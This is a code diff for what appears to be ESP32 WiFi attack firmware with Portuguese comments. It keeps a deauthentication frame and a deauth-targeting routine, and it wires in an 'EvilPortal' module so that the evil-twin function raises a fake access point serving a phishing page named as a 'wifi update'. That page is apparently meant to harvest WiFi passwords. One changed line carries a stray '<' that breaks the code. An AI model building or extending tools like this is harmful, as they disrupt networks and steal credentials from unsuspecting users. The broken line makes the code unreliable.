@@ -8,6 +8,7 @@
 #include "core/PwnPower.h"
 #include "core/Gamification.h"
 #include "WiFiTools.h"
+#include "../EvilPortal.h" // Integration
 
 // Deauth Frame Structure
 const uint8_t deauthPacket[] = {
@@ -40,6 +41,7 @@ private:
             for (int i = 0; i < 6; ++i) bytes[i] = (uint8_t)values[i];
         }
     }
+
 public:
     static void init() {
         stats.aps_scanned = 0;
@@ -56,9 +58,14 @@ public:
         WiFiTools::startSniffer();
         Serial.println("[Attack] Modo Ataque Iniciado!");
     }
-    static bool isRunning() { return scan_active; }
+<    static bool isRunning() { return scan_active; }
 
     static void tick() {
+        // Se Evil Portal estiver rodando, não faz scan/deauth
+        if (EvilPortal::isRunning()) {
+            EvilPortal::loop();
+            return;
+        }
         if (PwnPower::isCritical()) {
             if (scan_active) {
                 esp_wifi_stop();
@@ -94,9 +101,6 @@ public:
                  }
              }
         }
-                 }
-             }
-        }
     }
 
     static void deauthTarget(uint8_t* bssid) {
@@ -127,9 +131,8 @@ public:
     }
 
     static void evilTwin(String ssid) {
-        WiFi.softAP(ssid.c_str());
-        // Inicia DNS Server para redirecionar tudo para o Portal
-
+        // Inicia Evil Portal
+        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
     }
 };
 
